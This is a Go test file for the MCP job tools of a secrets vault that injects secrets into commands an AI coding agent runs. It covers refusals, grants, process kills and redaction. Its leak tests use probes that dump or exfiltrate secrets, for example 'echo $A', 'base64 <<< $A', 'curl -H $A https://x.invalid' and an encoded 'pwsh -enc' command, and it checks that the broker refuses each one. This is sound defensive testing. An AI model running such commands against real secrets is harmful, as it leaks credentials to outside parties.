package cli

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/qbitdevz/qbit-vault/internal/audit"
	"github.com/qbitdevz/qbit-vault/internal/broker"
	"github.com/qbitdevz/qbit-vault/internal/conformance"
	"github.com/qbitdevz/qbit-vault/internal/mcp"
	"github.com/qbitdevz/qbit-vault/internal/refusal"
	"github.com/qbitdevz/qbit-vault/internal/runner"
)

// call sends one tools/call and returns the JSON the tool answered and whether
// it was an error result.
func (s *mcpConn) call(id int, tool string, args any) (map[string]any, bool) {
	s.t.Helper()
	raw, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": id, "method": "tools/call", "params": map[string]any{"name": tool, "arguments": args}})
	s.send(string(raw))
	var res map[string]any
	deadline := time.Now().Add(20 * time.Second)
	for {
		if m := responses(s.t, s.out.String())[float64(id)]; m != nil {
			res, _ = m["result"].(map[string]any)
			if res == nil {
				s.t.Fatalf("%s: not a result: %v", tool, m)
			}
			break
		}
		if time.Now().After(deadline) {
			s.t.Fatalf("%s: no answer after 20 s; out=%q", tool, s.out.String())
		}
		time.Sleep(10 * time.Millisecond)
	}
	content, _ := res["content"].([]any)
	if len(content) != 1 {
		s.t.Fatalf("%s: content = %v", tool, res["content"])
	}
	var out map[string]any
	if err := json.Unmarshal([]byte(content[0].(map[string]any)["text"].(string)), &out); err != nil {
		s.t.Fatalf("%s: not JSON: %v", tool, content[0])
	}
	isErr, _ := res["isError"].(bool)
	return out, isErr
}

// jobWorld is a world with global secret A granted to the MCP session.
func jobWorld(t *testing.T) *world {
	t.Helper()
	w := newExecWorld(t)
	w.setSecret("A", xv, "--global")
	w.grantTo(mcpSession, "A", "session")
	return w
}

func execToolArgs(command string, extra map[string]any) map[string]any {
	a := map[string]any{"command": command, "secrets": []any{map[string]any{"name": "A"}}}
	for k, v := range extra {
		a[k] = v
	}
	return a
}

func (s *mcpConn) startJob(id int, command string, extra map[string]any) string {
	s.t.Helper()
	m, isErr := s.call(id, "secret_exec_start", execToolArgs(command, extra))
	job, _ := m["job"].(string)
	if isErr || m["ok"] != true || len(job) != 32 {
		s.t.Fatalf("start: %v", m)
	}
	return job
}

func (s *mcpConn) jobStatus(id int, job string, waitMS int) map[string]any {
	s.t.Helper()
	m, isErr := s.call(id, "secret_exec_status", map[string]any{"job": job, "wait_ms": waitMS})
	if isErr || m["ok"] != true {
		s.t.Fatalf("status: %v", m)
	}
	return m
}

func waitForPath(t *testing.T, path string) {
	t.Helper()
	deadline := time.Now().Add(20 * time.Second)
	for {
		if _, err := os.Stat(path); err == nil {
			return
		}
		if time.Now().After(deadline) {
			t.Fatalf("%s did not appear", filepath.Base(path))
		}
		time.Sleep(20 * time.Millisecond)
	}
}

func readPID(t *testing.T, path string) int {
	t.Helper()
	waitForPath(t, path)
	for i := 0; i < 100; i++ {
		if b, err := os.ReadFile(path); err == nil {
			if n, err := strconv.Atoi(strings.TrimSpace(string(b))); err == nil {
				return n
			}
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatal("no pid in the file")
	return 0
}

func waitGone(t *testing.T, pid int, what string) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for processAlive(pid) {
		if time.Now().After(deadline) {
			t.Fatalf("%s: process %d is still alive", what, pid)
		}
		time.Sleep(20 * time.Millisecond)
	}
}

// Rule 1 with the real exec backend: start returns while the command runs, the
// output comes incrementally and the exit code at the end.
func TestMCPJobRunsToItsEndWithIncrementalOutput(t *testing.T) {
	w := jobWorld(t)
	s := w.startMCP()
	command := child(t, "jobs-out", "700", 3)

	began := time.Now()
	job := s.startJob(10, command, nil)
	if took := time.Since(began); took > 5*time.Second {
		t.Fatalf("start took %v", took)
	}
	var out strings.Builder
	var final map[string]any
	n := 11
	for final == nil {
		m := s.jobStatus(n, job, 5000)
		n++
		out.WriteString(m["stdout"].(string))
		if m["state"] != "running" {
			final = m
		}
	}
	if final["state"] != "exited" || final["exit_code"] != float64(3) || out.String() != "first\nsecond\n" {
		t.Fatalf("state=%v exit=%v output=%q", final["state"], final["exit_code"], out.String())
	}
	if r, _ := s.call(99, "secret_exec_status", map[string]any{"job": job}); r["refusal"] == nil {
		t.Fatalf("the reported job is still there: %v", r)
	}
	o, e := s.finish()
	noFixtures(t, "mcp output", o+e)
	if e != "" {
		t.Fatalf("stderr = %q", e)
	}
	if got := w.auditEvents(audit.EventExec); len(got) != 2 || got[0].Outcome != "started" || got[1].Outcome != "finished" || *got[1].ExitCode != 3 {
		t.Fatalf("audit = %+v", got)
	}
}

// secret_exec still runs to the end and returns everything at once.
func TestMCPSecretExecIsUnchanged(t *testing.T) {
	w := jobWorld(t)
	s := w.startMCP()
	m, isErr := s.call(10, "secret_exec", execToolArgs(child(t, "jobs-out", "50", 4), nil))
	if isErr || m["stdout"] != "first\nsecond\n" || m["exit_code"] != float64(4) || m["ok"] != true {
		t.Fatalf("secret_exec = %v", m)
	}
	if _, has := m["state"]; has {
		t.Fatalf("secret_exec grew job fields: %v", m)
	}
	s.finish()
}

// Rule 1: every refusal exec gives before a process exists, start gives too:
// the same envelope, hint and audit record, and no process.
func TestMCPStartRefusesLikeExec(t *testing.T) {
	w := jobWorld(t)
	w.setSecret("B", xg, "--global", "--binaries", "gh")
	w.grantTo(mcpSession, "B", "session")
	w.setSecret("C", xp, "--global")
	mk := marker(t)
	run := child(t, "mark", mk, 0)
	s := w.startMCP()

	cases := []struct {
		name string
		args map[string]any
		typ  string
	}{
		{"unknown name", map[string]any{"command": run, "secrets": []any{map[string]any{"name": "NOPE"}}}, "unknown_secret"},
		{"no grant", map[string]any{"command": run, "secrets": []any{map[string]any{"name": "C"}}}, "grant_required"},
		{"dump guard", execToolArgs("env", nil), "dump_command"},
		{"value print", execToolArgs("echo $A", nil), "dump_command"},
		{"binary rule", map[string]any{"command": run, "secrets": []any{map[string]any{"name": "B"}}}, "scope_binary"},
		{"invalid name", map[string]any{"command": run, "secrets": []any{map[string]any{"name": "a-b"}}}, "invalid_name"},
	}
	id := 10
	for _, tc := range cases {
		before := len(w.refusalsOf(mcpSession))
		viaExec, e1 := s.call(id, "secret_exec", tc.args)
		viaStart, e2 := s.call(id+1, "secret_exec_start", tc.args)
		id += 2
		a, _ := json.Marshal(viaExec)
		b, _ := json.Marshal(viaStart)
		if !e1 || !e2 || string(a) != string(b) {
			t.Errorf("%s:\nexec  %s\nstart %s", tc.name, a, b)
			continue
		}
		rf, _ := viaStart["refusal"].(map[string]any)
		if rf["type"] != tc.typ || rf["hint"] == "" {
			t.Errorf("%s: refusal %v", tc.name, rf)
		}
		recs := w.refusalsOf(mcpSession)
		if len(recs) != before+2 || recs[len(recs)-1].Refusal != tc.typ || recs[len(recs)-2].Refusal != tc.typ {
			t.Errorf("%s: audit records %d, want %d of type %s", tc.name, len(recs)-before, 2, tc.typ)
		}
		for i := before; i < len(recs); i++ {
			if recs[i].Command != "" || recs[i].Reason != "" {
				t.Errorf("%s: the audit record carries more than the refusal: %+v", tc.name, recs[i])
			}
		}
	}
	if ran(mk) || len(w.auditEvents(audit.EventExec)) != 0 {
		t.Fatalf("a refused start left an exec record: %+v", w.auditEvents(audit.EventExec))
	}
	if m, _ := s.call(id, "secret_exec_status", map[string]any{"job": strings.Repeat("0", 32)}); m["refusal"] == nil {
		t.Fatalf("a refused start left a job: %v", m)
	}
	out, errs := s.finish()
	noFixtures(t, "mcp output", out+errs)
}

// Rule 1: a once grant is spent when the job starts, as in exec; not before,
// not at the end.
func TestMCPStartSpendsAOnceGrantAtStart(t *testing.T) {
	w := newExecWorld(t)
	w.setSecret("A", xv, "--global")
	w.grantTo(mcpSession, "A", "once")
	s := w.startMCP()
	job := s.startJob(10, child(t, "pid-sleep", filepath.Join(t.TempDir(), "pid"), 0), nil)

	for i, tool := range []string{"secret_exec_start", "secret_exec"} {
		m, isErr := s.call(11+i, tool, execToolArgs("true", nil))
		rf, _ := m["refusal"].(map[string]any)
		if !isErr || rf["type"] != "grant_required" {
			t.Fatalf("%s after the job started: %v", tool, m)
		}
	}
	if m, _ := s.call(20, "secret_exec_stop", map[string]any{"job": job}); m["state"] != "stopped" {
		t.Fatalf("stop = %v", m)
	}
	s.finish()
}

// Rule 1: a command that cannot start gives the once grant back and leaves no job.
func TestMCPStartThatCannotStartKeepsTheOnceGrant(t *testing.T) {
	w := newExecWorld(t)
	w.setSecret("A", xv, "--global")
	w.grantTo(mcpSession, "A", "once")
	old, calls := runCommand, 0
	runCommand = func(ctx context.Context, sp runner.Spec) (runner.Result, error) {
		if calls++; calls == 1 {
			return runner.Result{}, runner.ErrStart
		}
		return old(ctx, sp)
	}
	t.Cleanup(func() { runCommand = old })
	s := w.startMCP()
	m, isErr := s.call(10, "secret_exec_start", execToolArgs("true", nil))
	rf, _ := m["refusal"].(map[string]any)
	if !isErr || rf["type"] != "internal" {
		t.Fatalf("start = %v", m)
	}
	m, _ = s.call(11, "secret_exec_start", execToolArgs(child(t, "jobs-out", "10", 0), nil))
	if m["ok"] != true {
		t.Fatalf("the once grant was not given back: %v", m)
	}
	s.finish()
}

// A start on a locked vault opens the same named dialog exec opens.
func TestMCPStartOnALockedVaultAsksTheNamedRequester(t *testing.T) {
	w := grantedLockedWorld(t)
	t.Chdir(w.repo)
	f := withBackend(t, answers(val(fxPass)))
	s := w.startMCP()
	m, isErr := s.call(10, "secret_exec_start", map[string]any{"command": child(t, "jobs-out", "10", 0), "secrets": []any{map[string]any{"name": "TOKEN", "from": "A"}}})
	if isErr || m["ok"] != true {
		t.Fatalf("start = %v", m)
	}
	out, errs := s.finish()
	noFixtures(t, "mcp output", out+errs)
	if len(f.Calls) != 1 || f.Calls[0].Passphrase.Reason != "Claude Code wants to use A. Unlock the vault to continue." {
		t.Fatalf("calls = %+v", f.Calls)
	}
}

// Rule 2 and 7: stop kills the whole tree; the final state is stopped.
func TestMCPStopKillsTheProcessTree(t *testing.T) {
	w := jobWorld(t)
	pidFile := filepath.Join(t.TempDir(), "pid")
	s := w.startMCP()
	job := s.startJob(10, child(t, "pid-sleep", pidFile, 0), nil)
	pid := readPID(t, pidFile)
	if !processAlive(pid) {
		t.Fatal("the job's process is not running")
	}
	m, isErr := s.call(11, "secret_exec_stop", map[string]any{"job": job})
	if isErr || m["state"] != "stopped" {
		t.Fatalf("stop = %v", m)
	}
	waitGone(t, pid, "after stop")
	if again, _ := s.call(12, "secret_exec_stop", map[string]any{"job": job}); again["refusal"] == nil {
		t.Fatalf("a stopped job is still held: %v", again)
	}
	s.finish()
	fin := w.auditEvents(audit.EventExec)
	if last := fin[len(fin)-1]; last.Outcome != "finished" || last.Detail != "interrupted" {
		t.Fatalf("the stop was audited as %+v", last)
	}
}

// Rule 3: timeout_ms ends the job as timed_out, killing its tree.
func TestMCPJobTimeoutEndsItAsTimedOut(t *testing.T) {
	w := jobWorld(t)
	pidFile := filepath.Join(t.TempDir(), "pid")
	s := w.startMCP()
	job := s.startJob(10, child(t, "pid-sleep", pidFile, 0), map[string]any{"timeout_ms": 1000})
	pid := readPID(t, pidFile)
	m := s.jobStatus(11, job, 20000)
	if m["state"] != "timed_out" {
		t.Fatalf("status = %v", m)
	}
	waitGone(t, pid, "after the timeout")
	s.finish()
}

// Rule 2: when the server ends (the host closes stdin) every job's tree is killed.
func TestMCPServerShutdownKillsEveryJobsTree(t *testing.T) {
	w := jobWorld(t)
	dir := t.TempDir()
	s := w.startMCP()
	var pids []int
	for i := 0; i < 2; i++ {
		f := filepath.Join(dir, "pid"+strconv.Itoa(i))
		s.startJob(10+i, child(t, "pid-sleep", f, 0), nil)
		pids = append(pids, readPID(t, f))
	}
	out, errs := s.finish()
	for _, pid := range pids {
		if processAlive(pid) {
			t.Errorf("job process %d outlived the server", pid)
		}
	}
	noFixtures(t, "mcp output", out+errs)
	if errs != "" {
		t.Fatalf("stderr = %q", errs)
	}
}

// Rule 3: four jobs at once; the fifth is a retryable refusal, a stop frees a slot.
func TestMCPFifthJobIsRefused(t *testing.T) {
	w := jobWorld(t)
	dir := t.TempDir()
	s := w.startMCP()
	var jobs []string
	for i := 0; i < mcp.MaxRunningJobs; i++ {
		jobs = append(jobs, s.startJob(10+i, child(t, "pid-sleep", filepath.Join(dir, "p"+strconv.Itoa(i)), 0), nil))
	}
	m, isErr := s.call(20, "secret_exec_start", execToolArgs("true", nil))
	rf, _ := m["refusal"].(map[string]any)
	if !isErr || rf["retryable"] != true || rf["hint"] != refusal.HintJobsBusy {
		t.Fatalf("fifth start = %v", m)
	}
	if r, _ := s.call(21, "secret_exec_stop", map[string]any{"job": jobs[0]}); r["state"] != "stopped" {
		t.Fatalf("stop = %v", r)
	}
	s.startJob(22, child(t, "pid-sleep", filepath.Join(dir, "p9"), 0), nil)
	s.finish()
}

// Rule 7: a status call the client cancels does not kill the job, loses no output,
// and the job survives several calls.
func TestMCPCancelledStatusCallsDoNotKillTheJob(t *testing.T) {
	w := jobWorld(t)
	gate := filepath.Join(t.TempDir(), "gate")
	s := w.startMCP()
	job := s.startJob(10, child(t, "gate", gate, 0), nil)
	var seen strings.Builder
	n := 11
	for i := 0; i < 3; i++ {
		raw, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": 100 + i, "method": "tools/call", "params": map[string]any{"name": "secret_exec_status", "arguments": map[string]any{"job": job, "wait_ms": 50000}}})
		s.send(string(raw))
		time.Sleep(200 * time.Millisecond)
		s.send(cancelCall(100 + i))
		time.Sleep(200 * time.Millisecond)
		m := s.jobStatus(n, job, 0)
		n++
		seen.WriteString(m["stdout"].(string))
		if m["state"] != "running" {
			t.Fatalf("call %d: a cancelled status call ended the job: %v", i, m)
		}
	}
	if err := os.WriteFile(gate, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	m := s.jobStatus(n, job, 20000)
	seen.WriteString(m["stdout"].(string))
	if m["state"] != "exited" || seen.String() != "before\nafter\n" {
		t.Fatalf("state=%v output=%q", m["state"], seen.String())
	}
	s.finish()
}

// Rule 4: a value split across chunks and across status calls, raw and base64,
// never appears in any call, the audit log or any file.
func TestMCPJobOutputIsRedactedAcrossChunksAndStatusCalls(t *testing.T) {
	w := jobWorld(t)
	dir := t.TempDir()
	s := w.startMCP()
	job := s.startJob(10, child(t, "gated-split", dir+"|A", 0), nil)

	var stdout, stderr strings.Builder
	redactions := 0
	take := func(id int, wait int) map[string]any {
		m := s.jobStatus(id, job, wait)
		stdout.WriteString(m["stdout"].(string))
		stderr.WriteString(m["stderr"].(string))
		redactions += int(m["redactions"].(float64))
		return m
	}
	waitForPath(t, filepath.Join(dir, "ready1"))
	time.Sleep(150 * time.Millisecond)
	first := take(11, 0)
	if strings.Contains(first["stdout"].(string), "TESTSECRET") || strings.Contains(first["stdout"].(string), xv[:10]) {
		t.Fatalf("the first half of the value left in the first call: %q", first["stdout"])
	}
	touch(filepath.Join(dir, "go1"))
	waitForPath(t, filepath.Join(dir, "ready2"))
	time.Sleep(150 * time.Millisecond)
	take(12, 0)
	touch(filepath.Join(dir, "go2"))
	last := take(13, 20000)
	if last["state"] != "exited" {
		t.Fatalf("state = %v", last["state"])
	}
	if strings.Count(stdout.String(), "[REDACTED:A]") != 1 || !strings.Contains(stdout.String(), "raw:") {
		t.Fatalf("stdout = %q", stdout.String())
	}
	if strings.Count(stderr.String(), "[REDACTED:A]") != 1 || !strings.Contains(stderr.String(), "b64:") {
		t.Fatalf("stderr = %q", stderr.String())
	}
	if redactions != 2 {
		t.Fatalf("redactions summed over the calls = %d, want 2", redactions)
	}
	out, errs := s.finish()
	b64 := base64.StdEncoding.EncodeToString([]byte(xv))
	for _, what := range []struct{ name, text string }{{"mcp stdout", out}, {"mcp stderr", errs}, {"audit log", w.auditText()}} {
		noFixtures(t, what.name, what.text)
		if strings.Contains(what.text, b64) || strings.Contains(what.text, b64[:20]) {
			t.Fatalf("the base64 of the value is in the %s", what.name)
		}
	}
	filepath.WalkDir(w.home, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if b, err := os.ReadFile(path); err == nil && (strings.Contains(string(b), "TESTSECRET_") || strings.Contains(string(b), "[REDACTED")) {
			t.Errorf("%s holds a value or job output", filepath.Base(path))
		}
		return nil
	})
}

// Invariant 4: the job's child gets an empty stdin of its own, never the MCP
// stream the server reads its requests from, and the injected value goes in its
// environment only.
func TestMCPJobChildDoesNotInheritTheMCPStream(t *testing.T) {
	w := jobWorld(t)
	old := runCommand
	t.Cleanup(func() { runCommand = old })
	var got runner.Spec
	runCommand = func(_ context.Context, sp runner.Spec) (runner.Result, error) {
		got = sp
		sp.OnStart()
		return runner.Result{Started: true}, nil
	}
	s := w.startMCP()
	job := s.startJob(10, "true", nil)
	s.jobStatus(11, job, 5000)
	s.finish()
	if got.Stdin == nil {
		t.Fatal("the job's child inherits the process stdin, the MCP stream")
	}
	if n, err := got.Stdin.Read(make([]byte, 8)); n != 0 || err == nil {
		t.Fatalf("the child's stdin is not empty: %d %v", n, err)
	}
	if v, ok := got.Env["A"]; !ok || v.Len() != len(xv) || len(got.Env) != 1 {
		t.Fatalf("injected environment: %d names", len(got.Env))
	}
	if got.Stdout == nil || got.Stderr == nil || got.Timeout != 10*time.Minute {
		t.Fatalf("spec: stdout %v stderr %v timeout %v", got.Stdout != nil, got.Stderr != nil, got.Timeout)
	}
}

// Jobs exist only over MCP: `broker --op` answers them as an unknown op and
// does not advertise the capability.
func TestBrokerOpDoesNotServeJobs(t *testing.T) {
	w := jobWorld(t)
	for _, op := range []string{"exec_start", "exec_status", "exec_stop"} {
		req := envelope(op, w.outside, `"job":"`+strings.Repeat("a", 32)+`"`)
		if op == "exec_start" {
			req = envelope(op, w.outside, `"command":"true","secrets":[{"name":"A"}]`)
		}
		code, m, _ := w.broker(op, req)
		rf, _ := m["refusal"].(map[string]any)
		if code == 0 || rf == nil || rf["message"] != "invalid request: op" {
			t.Errorf("%s over broker --op: code=%d %v", op, code, m)
		}
	}
	_, m, _ := w.broker("capabilities", envelope("capabilities", w.outside, ""))
	if _, has := m["exec_jobs"]; has {
		t.Fatalf("broker --op advertises exec_jobs: %v", m)
	}
}

// The job ops conform to the schema, requests and responses, with the real backend.
func TestMCPJobOpsConformToTheSchema(t *testing.T) {
	sch, err := conformance.Load(filepath.Join("..", "..", "contracts", "secrets-broker", "v1", "secrets-broker.v1.schema.json"))
	if err != nil {
		t.Fatal(err)
	}
	w := jobWorld(t)
	g := &globals{getenv: envFrom(nil), home: w.home}
	jobs := mcp.NewJobs(&cliBackend{g: g})
	t.Cleanup(jobs.Shutdown)
	handle := func(op, extra string) (string, map[string]any) {
		req := strings.Replace(envelope(op, w.outside, extra), brokerSession, mcpSession, 1)
		if err := sch.Request(op, []byte(req)); err != nil {
			t.Errorf("%s: our own request is not conformant: %v", op, err)
		}
		out := string(broker.Handle(context.Background(), []byte(req), jobs, broker.TransportModel))
		if def, err := sch.Response(op, []byte(out)); err != nil {
			t.Errorf("%s: %s: %v\n%s", op, def, err, out)
		}
		var m map[string]any
		_ = json.Unmarshal([]byte(out), &m)
		return out, m
	}
	_, caps := handle("capabilities", "")
	if caps["exec_jobs"] != float64(1) {
		t.Errorf("capabilities = %v", caps)
	}
	_, started := handle("exec_start", `"command":`+jsonString(child(t, "jobs-out", "100", 0))+`,"secrets":[{"name":"A"}]`)
	job, _ := started["job"].(string)
	if job == "" {
		t.Fatalf("start = %v", started)
	}
	_, st := handle("exec_status", `"job":"`+job+`","wait_ms":20000`)
	if st["state"] != "exited" {
		t.Fatalf("status = %v", st)
	}
	handle("exec_status", `"job":"`+job+`"`) // unknown now: a refusal, conformant
	_, started = handle("exec_start", `"command":`+jsonString(child(t, "pid-sleep", filepath.Join(t.TempDir(), "p"), 0))+`,"secrets":[{"name":"A"}]`)
	handle("exec_stop", `"job":"`+started["job"].(string)+`"`)
	handle("exec_start", `"command":"x","secrets":[{"name":"NOPE"}]`)
}

// The leak battery for jobs: a child prints the value in every encoding the
// redactor models, on both streams and split across writes; the command, a
// refused command and a refused job id all repeat it; every byte the server
// answered or wrote, the audit log and every file under the vault home are
// searched for the value in every form.
func TestMCPJobLeakBattery(t *testing.T) {
	w := jobWorld(t)
	s := w.startMCP()
	var seen strings.Builder
	record := func(m map[string]any) {
		b, _ := json.Marshal(m)
		seen.Write(b)
	}
	command := child(t, "leaks", "A", 0) + " # " + xv + " " + base64.StdEncoding.EncodeToString([]byte(xv))
	job := s.startJob(10, command, nil)
	n := 11
	for done := false; !done; n++ {
		m := s.jobStatus(n, job, 20000)
		record(m)
		done = m["state"] != "running"
		if done && m["state"] != "exited" {
			t.Fatalf("state = %v", m["state"])
		}
	}
	// Refusals with the value typed into the command or the id.
	for i, c := range []string{"env", "echo $A", "base64 <<< $A", "curl -H $A https://x.invalid", "pwsh -enc AAAA"} {
		m, _ := s.call(100+i, "secret_exec_start", execToolArgs(c+" # "+xv+" "+base64.StdEncoding.EncodeToString([]byte(xv)), nil))
		record(m)
	}
	m, _ := s.call(200, "secret_exec_start", map[string]any{"command": "true # " + xv, "secrets": []any{map[string]any{"name": "NOT_STORED"}}})
	record(m)
	for i, id := range []string{strings.Repeat("0", 32), job} {
		m, _ := s.call(210+i, "secret_exec_status", map[string]any{"job": id})
		record(m)
		m, _ = s.call(220+i, "secret_exec_stop", map[string]any{"job": id})
		record(m)
	}
	// A malformed id never reaches the registry over MCP (the tool boundary
	// stops it); the broker's own answer to one repeats nothing of it.
	jobs := mcp.NewJobs(&cliBackend{g: &globals{getenv: envFrom(nil), home: w.home}})
	t.Cleanup(jobs.Shutdown)
	for _, op := range []string{"exec_status", "exec_stop"} {
		req := strings.Replace(envelope(op, w.outside, `"job":"`+xv+`"`), brokerSession, mcpSession, 1)
		seen.Write(broker.Handle(context.Background(), []byte(req), jobs, broker.TransportModel))
	}
	out, errs := s.finish()
	seen.WriteString(out + errs + w.auditText())

	needles := map[string]string{
		"raw":  xv,
		"b64":  base64.StdEncoding.EncodeToString([]byte(xv)),
		"b64u": base64.URLEncoding.EncodeToString([]byte(xv)),
		"pct":  url.QueryEscape(xv),
	}
	check := func(where string, data []byte) {
		for enc, nd := range needles {
			if strings.Contains(string(data), nd) {
				t.Errorf("%s holds the value (%s)", where, enc)
			}
		}
	}
	check("job traffic, stderr and audit log", []byte(seen.String()))
	if !strings.Contains(seen.String(), "[REDACTED:A]") {
		t.Error("the battery never saw a redaction")
	}
	if errs != "" {
		t.Errorf("stderr = %q", errs)
	}
	_ = filepath.WalkDir(w.home, func(p string, d os.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			b, _ := os.ReadFile(p)
			check(filepath.Base(p), b)
		}
		return nil
	})
}
